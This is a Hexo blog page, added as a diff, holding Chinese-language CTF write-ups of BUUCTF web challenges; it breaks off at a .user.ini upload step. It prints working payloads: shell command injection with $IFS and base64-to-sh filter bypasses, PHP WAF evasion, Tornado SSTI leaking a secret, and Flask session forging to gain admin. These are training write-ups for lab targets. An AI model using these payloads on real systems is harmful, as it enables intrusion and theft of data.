@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>CTF-wp-BUUCTF Web | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Ping Ping Ping来源： GXYCTF2019 考察：RCE，空格绕过 参考：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wangtanzhi&#x2F;p&#x2F;12246386.html 页面提示 1?ip&#x3D; 故在URL处设置ip 1&#x2F;?ip&#x3D;127.0.0.1 有回显 123?ip&#x3D;127.0.0.1|ls?ip&#x3D;127.0.0.1|cat f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-wp-BUUCTF Web">
+<meta property="og:url" content="http://example.com/2021/02/28/CTF-wp-BUUCTF-Web/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Ping Ping Ping来源： GXYCTF2019 考察：RCE，空格绕过 参考：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wangtanzhi&#x2F;p&#x2F;12246386.html 页面提示 1?ip&#x3D; 故在URL处设置ip 1&#x2F;?ip&#x3D;127.0.0.1 有回显 123?ip&#x3D;127.0.0.1|ls?ip&#x3D;127.0.0.1|cat f">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-02-28T02:29:10.000Z">
+<meta property="article:modified_time" content="2021-03-04T03:29:57.437Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-CTF-wp-BUUCTF-Web" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/28/CTF-wp-BUUCTF-Web/" class="article-date">
+  <time class="dt-published" datetime="2021-02-28T02:29:10.000Z" itemprop="datePublished">2021-02-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      CTF-wp-BUUCTF Web
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><p>来源： GXYCTF2019</p>
+<p>考察：RCE，空格绕过</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12246386.html">https://www.cnblogs.com/wangtanzhi/p/12246386.html</a></p>
+<p>页面提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;</span><br></pre></td></tr></table></figure>
+<p>故在URL处设置ip</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1</span><br></pre></td></tr></table></figure>
+<p>有回显</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1|ls</span><br><span class="line">?ip&#x3D;127.0.0.1|cat flag.php </span><br><span class="line">?ip&#x3D;127.0.0.1|flag.php</span><br></pre></td></tr></table></figure>
+<p>有过滤</p>
+<p>fuzz一下，发现{}这些都被过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;cat$IFS$1index.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;&#x2F;\&amp;|\&#x2F;|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F; &#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;bash&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;.*f.*l.*a.*g.*&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a &#x3D; shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>故不能直接输入flag</p>
+<p>payload1：设置变量法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.ph</span><br></pre></td></tr></table></figure>
+<p>payload2：base64编码法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
+<h2 id="PHP下空格检测绕过"><a href="#PHP下空格检测绕过" class="headerlink" title="PHP下空格检测绕过"></a>PHP下空格检测绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09 </span><br></pre></td></tr></table></figure>
+<h1 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h1><p>来源：ACTF2020新生赛</p>
+<p>考察：RCE</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post data:target&#x3D;127.0.0.1;cd ..&#x2F;..&#x2F;..;cat flag</span><br></pre></td></tr></table></figure>
+<h1 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h1><p>来源：极客大挑战2019</p>
+<p>考察：菜刀使用</p>
+<p>使用菜刀连接，密码为Syc</p>
+<h1 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h1><p>来源：护网杯2018</p>
+<p>考察：SSTI</p>
+<p>hint.txt提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
+<p>flag.txt提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag in &#x2F;fllllllllllllag</span><br></pre></td></tr></table></figure>
+<p>welcome.txt提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render</span><br></pre></td></tr></table></figure>
+<p>注意到，URL形式为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file?filename&#x3D;&#x2F;welcome.txt&amp;filehash&#x3D;8ac8b45a29c64746207667391eeb39f1</span><br></pre></td></tr></table></figure>
+<p>故现在求出cookie_secret后，进行md5运算即可得到filehash</p>
+<p>尝试一个错误的filehash，返回error?msg</p>
+<p>尝试SSTI</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg&#x3D;&#123;&#123;1&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>回显1，说明存在SSTI</p>
+<p>尝试运算的SSTI</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg&#123;&#123;1+2&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>回显Orz，说明不存在运算</p>
+<p>获取tornado框架附属配置文件handler.settings，得到cookie_secret</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>之后运算得到filehash</p>
+<h1 id="Easy-Calc"><a href="#Easy-Calc" class="headerlink" title="Easy_Calc"></a>Easy_Calc</h1><p>来源：RoarCTF2019</p>
+<p>考察：waf绕过</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/remon535/p/12727042.html">https://www.cnblogs.com/remon535/p/12727042.html</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;calc.php?num&#x3D;1%2B2 HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
+<p>查看calc.php，发现过滤的黑名单</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#39;num&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line">        $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&#39;echo &#39;.$str.&#39;;&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>加空格，绕过检测</p>
+<p>原理：加空格使waf把num参数错误解析成%20num，这个参数是不存在的，但php解析的时候会自动把空格删掉，从而bypass。</p>
+<p>scandir查看目录，/被过滤，使用ascii码</p>
+<p>var_dump用于判断变量的类型和长度，若有变量值可以输出，则输出其值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump ( mixed expression [, mixed expression [, ...]] )</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num&#x3D;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(24) &#123; [0]&#x3D;&gt; string(1) &quot;.&quot; [1]&#x3D;&gt; string(2) &quot;..&quot; [2]&#x3D;&gt; string(10) &quot;.dockerenv&quot; [3]&#x3D;&gt; string(3) &quot;bin&quot; [4]&#x3D;&gt; string(4) &quot;boot&quot; [5]&#x3D;&gt; string(3) &quot;dev&quot; [6]&#x3D;&gt; string(3) &quot;etc&quot; [7]&#x3D;&gt; string(5) &quot;f1agg&quot; [8]&#x3D;&gt; string(4) &quot;home&quot; [9]&#x3D;&gt; string(3) &quot;lib&quot; [10]&#x3D;&gt; string(5) &quot;lib64&quot; [11]&#x3D;&gt; string(5) &quot;media&quot; [12]&#x3D;&gt; string(3) &quot;mnt&quot; [13]&#x3D;&gt; string(3) &quot;opt&quot; [14]&#x3D;&gt; string(4) &quot;proc&quot; [15]&#x3D;&gt; string(4) &quot;root&quot; [16]&#x3D;&gt; string(3) &quot;run&quot; [17]&#x3D;&gt; string(4) &quot;sbin&quot; [18]&#x3D;&gt; string(3) &quot;srv&quot; [19]&#x3D;&gt; string(8) &quot;start.sh&quot; [20]&#x3D;&gt; string(3) &quot;sys&quot; [21]&#x3D;&gt; string(3) &quot;tmp&quot; [22]&#x3D;&gt; string(3) &quot;usr&quot; [23]&#x3D;&gt; string(3) &quot;var&quot; &#125; </span><br></pre></td></tr></table></figure>
+<p>查看f1aag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
+<h2 id="利用PHP字符串解析特性绕过waf"><a href="#利用PHP字符串解析特性绕过waf" class="headerlink" title="利用PHP字符串解析特性绕过waf"></a>利用PHP字符串解析特性绕过waf</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>
+<p>原理：加空格使waf把var参数错误解析成%20var，这个参数是不存在的，但php解析的时候会自动把空格删掉，从而bypass。同时PHP还会把某些字符转换成下划线。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入                                      解析的PHP                           用户名</span><br><span class="line">%20foo_bar%00            	            foo_bar            	                foo_bar            </span><br><span class="line">foo%20bar%00            	                foo bar            	                foo_bar            </span><br><span class="line">foo%5bbar            	                foo[bar            	                foo_bar    </span><br></pre></td></tr></table></figure>
+<h1 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h1><p>来源：极客大挑战2019</p>
+<p>考察：burp</p>
+<p>dirmap扫描到Secret.php，访问后提示需要来自<a target="_blank" rel="noopener" href="https://www.sycsecret.com,修改header,添加referer字段/">https://www.Sycsecret.com，修改header，添加referer字段</a></p>
+<p>之后根据提示不断改包即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;Secret.php HTTP&#x2F;1.1</span><br><span class="line">Host: node3.buuoj.cn:26729</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: UM_distinctid&#x3D;177e687e99a33-0c1e5b912ef271-47534130-13c680-177e687e99d41</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">referer: https:&#x2F;&#x2F;www.Sycsecret.com</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="BackupFile"><a href="#BackupFile" class="headerlink" title="BackupFile"></a>BackupFile</h1><p>来源：ACTF2020新生赛</p>
+<p>考察：信息搜集</p>
+<p>访问index.php.bak</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?key&#x3D;123</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>来源：HCTF2018</p>
+<p>考察：flask的session伪造</p>
+<p>注册并登陆后，发现显示了用户名。判断为二次注入。但尝试之后，发现二次注入会导致web server错误，并且无正确回显，放弃。</p>
+<p>登录后，在主页面看到注释 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- you are not admin --&gt;</span><br></pre></td></tr></table></figure>
+<p>说明要以admin登录</p>
+<p>在change password页面下，有注释</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F; --&gt;</span><br></pre></td></tr></table></figure>
+<p>访问并下载，得到源码，发现其根据session判断用户是否为admin</p>
+<p>flask的session是一个字符串，由句号分割成三个部分，第一个部分是base64加密的数据，第二个部分是时间戳，第三个部分是校验信息</p>
+<p>解密session代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span>(<span class="params">payload</span>):</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    print( payload)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;f1c3cbc2d6b1c0e5b8f1d5a0c19cf89d12e63f6dd22c1f41f6830d8a10e41cac5e653c4e7f774ec1e068fb7bf2d24995d146b7c18a14b0525f8aa48c7baf51e3&#39;, &#39;csrf_token&#39;: b&#39;eb20dbd07b0c3c9c7573a2d4fddd56c767e75d34&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;</span><br></pre></td></tr></table></figure>
+<p>使用flask_session_cookie_manager</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;f1c3cbc2d6b1c0e5b8f1d5a0c19cf89d12e63f6dd22c1f41f6830d8a10e41cac5e653c4e7f774ec1e068fb7bf2d24995d146b7c18a14b0525f8aa48c7baf51e3&#39;, &#39;csrf_token&#39;: b&#39;eb20dbd07b0c3c9c7573a2d4fddd56c767e75d34&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;&quot;</span><br></pre></td></tr></table></figure>
+<h1 id="Buy-You-Flag"><a href="#Buy-You-Flag" class="headerlink" title="Buy You Flag"></a>Buy You Flag</h1><p>来源：极客大挑战2019</p>
+<p>考察：burp改包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">	$password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password &#x3D;&#x3D; 404) &#123;</span><br><span class="line">		echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>更改cookie值</p>
+<p>直接提交money为100000000，提示长度太长</p>
+<p>wp说使用的strcmp，故使money[]=1即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;pay.php HTTP&#x2F;1.1</span><br><span class="line">Host: 6c6427ff-fe35-4f04-98e0-d1b7c23a75c9.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: UM_distinctid&#x3D;177e687e99a33-0c1e5b912ef271-47534130-13c680-177e687e99d41; user&#x3D;1</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 31</span><br><span class="line"></span><br><span class="line">password&#x3D;404s&amp;money[]&#x3D;100000000</span><br></pre></td></tr></table></figure>
+<h1 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h1><p>来源：SUCTF2019</p>
+<p>考察：文件上传</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2907426b4a91">https://www.jianshu.com/p/2907426b4a91</a></p>
+<p>.user.ini中设置auto_prepend_file，可以将文件自动添加到index.php中</p>
+<p>.user.ini</p>
